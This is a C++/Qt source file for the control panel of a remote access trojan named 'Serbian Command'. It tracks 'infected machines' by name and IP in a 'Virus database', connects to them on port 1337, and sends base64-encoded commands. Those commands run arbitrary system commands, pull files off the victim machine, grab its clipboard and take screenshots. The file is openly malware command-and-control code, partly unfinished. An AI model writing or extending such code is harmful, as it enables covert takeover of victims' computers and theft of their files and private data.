#include "mainwindow.h"
#include "ui_mainwindow.h"




/*









TODO: Load the DB into the treeview using std::queue
      Setup the handler switching using switch
      Define the read behavior according to the handlers -> new window like Information to print the result of a cmd









*/

/**
 * @brief MainWindow::MainWindow Constructor of the main window of the server
 * @param parent The parent widget of the new window
 */
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    //UI setup
    ui->setupUi(this);
    this->statusLabel = new QLabel("Waiting for a database to be loaded...");
    this->statusBar()->addWidget(statusLabel);
    this->loadedFile = nullptr;

    this->networdHandler = NIL;

    //Network setup
    this->clientSocket = new QTcpSocket(this);

    //Setting our error handler
    connect(clientSocket, QOverload<QTcpSocket::SocketError>::of(&QTcpSocket::error), this, &MainWindow::displayError);
    connect(clientSocket, &QAbstractSocket::readyRead, this, &MainWindow::read);
    connect(clientSocket, &QAbstractSocket::disconnected, clientSocket, &QObject::deleteLater);

}

/**
 * @brief MainWindow::~MainWindow Destructor for the main window
 */
MainWindow::~MainWindow()
{
    clientSocket->flush();
    clientSocket->close();
    delete ui;
}

/**
 * @brief MainWindow::on_actionHelp_triggered Creates a new window that displays the help on click of the help button. See {@link HelpWindow}
 */
void MainWindow::on_actionHelp_triggered()
{
    HelpWindow* h = new HelpWindow(this);
    h->show();
    h->setFocus();
}

/**
 * @brief MainWindow::on_actionQuit_triggered Calls the close method of this window on click
 */
void MainWindow::on_actionQuit_triggered()
{
    close();
}

/**
 * @brief MainWindow::on_clipboardButton_clicked Displays a new window that displays the content of the remote clipboard
 */
void MainWindow::on_clipboardButton_clicked()
{
    if(this->clientSocket->state() != QAbstractSocket::ConnectedState){
       QMessageBox::information(this, "Serbian Command", "Not connected to a machine");
       return;
    }

    this->statusLabel->setText("Sending CLP to " + this->selectedMachineName);
    QString cmd = QString("CLP");
    resetStatusTimer(3);

    this->networdHandler = CLP;

    //Waiting for transmission to be over
    ClipboardWindow* c = new ClipboardWindow(this, "returnStr");
    c->show();
    c->setFocus();
}

/**
 * @brief MainWindow::on_connectButton_clicked Connects to the selected machine
 */
void MainWindow::on_connectButton_clicked()
{
    if(this->selectedMachineIp.isEmpty() || this->selectedMachineIp.isEmpty()){
       if(this->ui->tableWidget->rowCount() == 0){
         QMessageBox::information(this, "Serbian Command", "No machine to connect to");
         return;
       }

      //Defaulting to the first machine
      this->on_tableWidget_cellClicked(0,0);
    }
    this->statusLabel->setText("Connecting to machine " + selectedMachineName + " on port 1337...");
    if(this->clientSocket->state() == QAbstractSocket::ConnectedState){
      this->clientSocket->close();
    }
    this->clientSocket->connectToHost(this->selectedMachineIp, 1337);

    resetStatusTimer(3);
}

/**
 * @brief MainWindow::on_sendCmdButton_clicked Sends a command to the selected machine
 */
void MainWindow::on_sendCmdButton_clicked()
{
    if(this->clientSocket->state() != QAbstractSocket::ConnectedState){
        QMessageBox::information(this, "Serbian Command", "Not connected to a machine");
        return;
    }
    this->statusLabel->setText("Sending SYS:" + this->ui->cmdLine->text());
    QString cmd = ("SYS:" + this->ui->cmdLine->text());

    resetStatusTimer(3);
    sendCmd(cmd);
    this->ui->cmdLine->setText("");
}

/**
 * @brief MainWindow::on_extractButton_clicked Extract a file from remote a displays a 'Save As ...' window
 */
void MainWindow::on_extractButton_clicked()
{
   if(this->clientSocket->state() != QAbstractSocket::ConnectedState){
      QMessageBox::information(this, "Serbian Command", "Not connected to a machine");
      return;
   }
   this->statusLabel->setText("Sending EXT:" + this->ui->fileLine->text());
   QString cmd = ("EXT:" + this->ui->fileLine->text());
   resetStatusTimer(3);
   sendCmd(cmd);
}

/**
 * @brief MainWindow::on_screenshotButton_clicked Takes a screenshot on the remote machine and displays it on the server
 */
void MainWindow::on_screenshotButton_clicked()
{
  if(this->clientSocket->state() != QAbstractSocket::ConnectedState){
     QMessageBox::information(this, "Serbian Command", "Not connected to a machine");
     return;
  }
  this->statusLabel->setText("Sending SCR");
  QString cmd = QString("SCR");
  resetStatusTimer(3);
  sendCmd(cmd);
}

/**
 * @brief MainWindow::on_actionLoad_triggered Displays an "Open" window and loads a database
 */
void MainWindow::on_actionLoad_triggered()
{
  QString fileName = QFileDialog::getOpenFileName(this,tr("Open Database"), "",tr("Virus database (*.vdb)"));
  QFile *saveFile = new QFile(fileName);
  if (!saveFile->open(QIODevice::ReadOnly)) {
      qWarning("Couldn't open save file.");
      return;
  }
  this->loadedFile = saveFile;

  this->statusLabel->setText("Loading database...");

  QByteArray fileStr = saveFile->readAll();
  loadedFile->close();

  QJsonDocument loadedJSON(QJsonDocument::fromJson(fileStr));
  qDebug() << loadedJSON.object();

  resetStatusTimer(3);
}

/**
 * @brief MainWindow::on_actionSave_triggered If no file as been selected, calls actionSave_as, otherwise writes data to file
 */
void MainWindow::on_actionSave_triggered()
{
  if(this->loadedFile == nullptr){
    on_actionSave_as_triggered();
    return;
  }
  if (!this->loadedFile->open(QIODevice::WriteOnly)) {
      qWarning("Couldn't open save file.");
      return;
  }
  this->loadedFile->close();
  writeJSONToFile(this->loadedFile);
}

/**
 * @brief MainWindow::on_actionSave_as_triggered Displays a "Save as ..." window, and writes data to file
 */
void MainWindow::on_actionSave_as_triggered()
{
  QString fileName = QFileDialog::getSaveFileName(this,tr("Open Database"), "",tr("Virus database (*.vdb)"));
  QFile *saveFile = new QFile(fileName);
  if (!saveFile->open(QIODevice::WriteOnly)) {
      qWarning("Couldn't open save file.");
      return;
  }
  saveFile->close();
  this->loadedFile = saveFile;
  writeJSONToFile(this->loadedFile);
}

/**
 * @brief on_tableWidget_cellClicked Changes the selected machine attribute according to user input
 * @param row The row of the cell that has been clicked on
 * @param column Unused
 */
void MainWindow::on_tableWidget_cellClicked(int row, int column){
  this->selectedMachineIp = this->ui->tableWidget->item(row, 1)->text();
  this->selectedMachineName = this->ui->tableWidget->item(row, 0)->text();
}

/**
 * @brief MainWindow::prepareJSON Goes through the QTableWidget, and prepares a QJsonDocument
 * @return A JSON describing the database status
 */
QJsonDocument* MainWindow::prepareJSON()
{
  QJsonObject mainJson = QJsonObject();
  QJsonArray machineArray = QJsonArray();

  for(int i = 0; i < this->ui->tableWidget->rowCount(); i++){
    QString name = this->ui->tableWidget->item(i,0)->text();
    QString ip = this->ui->tableWidget->item(i,1)->text();

    QJsonObject machine = QJsonObject();

    machine["Machine Name"] = name;
    machine["Machine IP"] = ip;


    machineArray.append(machine);
  }

  mainJson["Machines"] = machineArray;
  QJsonDocument *JsonDoc = new QJsonDocument(mainJson);

  return JsonDoc;
}

/**
 * @brief MainWindow::writeJSONToFile Prepares and write the JSON to a file
 * @param file The file to write to
 */
void MainWindow::writeJSONToFile(QFile* file){
  if(!file->open(QIODevice::WriteOnly  | QFile::Truncate)) {
    qWarning("Couldn't open save file.");
    return;
  }
  QJsonDocument* doc = prepareJSON();
  file->write(doc->toJson());
  file->close();
}

/**
 * @brief MainWindow::displayError Custom socket errors handler
 * @param socketError The socket error that will be handled
 */
void MainWindow::displayError(QTcpSocket::SocketError socketError)
{
    switch (socketError) {
    case QAbstractSocket::HostNotFoundError:
        this->statusLabel->setText(this->selectedMachineName + ": Host not found");
        QMessageBox::information(this, "Serbian Command", "Host not found");
        break;
    case QAbstractSocket::ConnectionRefusedError:
        this->statusLabel->setText(this->selectedMachineName + ": Connection refused");
        QMessageBox::information(this, "Serbian Command", "Connection refused by remote client");
        break;
    default:
        this->statusLabel->setText(this->selectedMachineName + ": Error");
        QMessageBox::information(this, "Serbian Command", "The following error occurred:" + (this->clientSocket->errorString()));
    }
    this->clientSocket->close();
    resetStatusTimer(5);
}

/**
 * @brief MainWindow::read Called when data arrives on the socket
 */
void MainWindow::read(){
  QString returnStr = this->clientSocket->readAll();
  qDebug() << returnStr;
}

/**
 * @brief MainWindow::sendCmd Sends a command over the network to a remote machine using just a QString
 * @param cmd The command to send to the remote machine
 */
void MainWindow::sendCmd(QString cmd){
  this->clientSocket->write((cmd + "\n").toUtf8().toBase64());
  this->clientSocket->flush();
}

/**
 * @brief MainWindow::resetStatusTimer Calls resetStatus after a timer ends
 * @param timeSec Defaults to 0. Time in seconds before the reset
 */
void MainWindow::resetStatusTimer(int timeSec = 0){
  QTimer::singleShot(timeSec * 1000, this, &MainWindow::resetStatus);
}

/**
 * @brief MainWindow::resetStatus Resets the status with a premade string of the type "Message + Number of machines in store"
 */
void MainWindow::resetStatus(){
  QString status = "Standing by. There are " + QString::number(this->ui->tableWidget->rowCount()) + " infected machines.";
  if(this->clientSocket->state() == QAbstractSocket::ConnectedState){
    status += (" Connected to machine " + this->selectedMachineName);
  }
  this->statusLabel->setText(status);
}
